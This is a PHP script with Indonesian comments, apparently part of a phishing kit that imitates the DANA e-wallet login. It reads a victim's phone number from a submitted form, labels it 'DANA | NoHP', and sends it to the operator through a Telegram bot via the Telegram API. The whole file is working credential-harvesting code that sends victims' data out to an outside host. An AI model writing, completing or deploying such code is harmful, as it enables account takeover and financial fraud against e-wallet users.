<?php
// Include file telegram.php (pastikan path-nya sesuai dengan struktur file Anda)
include "../../telegram.php";

// Mulai session PHP
session_start();

// Ambil nomor HP dari POST data
$nohp = $_POST['nohp'];

// Lakukan pengolahan string (jika diperlukan)
$nohp = str_replace("-", "", $nohp);
$nohp = "<code>".$nohp."</code>";

// Simpan nomor HP dalam session
$_SESSION['nohp'] = $nohp;

// Buat pesan yang akan dikirim ke Telegram
$message = "
( DANA | NoHP | ".$nohp." )

- No HP : ".$nohp."
";

// Fungsi untuk mengirim pesan ke Telegram
function sendMessage($id_telegram, $message, $id_botTele) {
    // URL untuk mengirim pesan menggunakan API Telegram
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=HTML&chat_id=" . $id_telegram;

    // Setup cURL untuk melakukan request POST
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'text' => $message
    ]);

    // Eksekusi request dan ambil responsenya
    $response = curl_exec($ch);

    // Tutup koneksi cURL
    curl_close($ch);

    // Cek jika ada error dalam pengiriman
    if ($response === false) {
        echo "Failed to send message to Telegram: " . curl_error($ch);
    }
}

// Panggil fungsi sendMessage dengan parameter yang sesuai
sendMessage($id_telegram, $message, $id_botTele);
?>
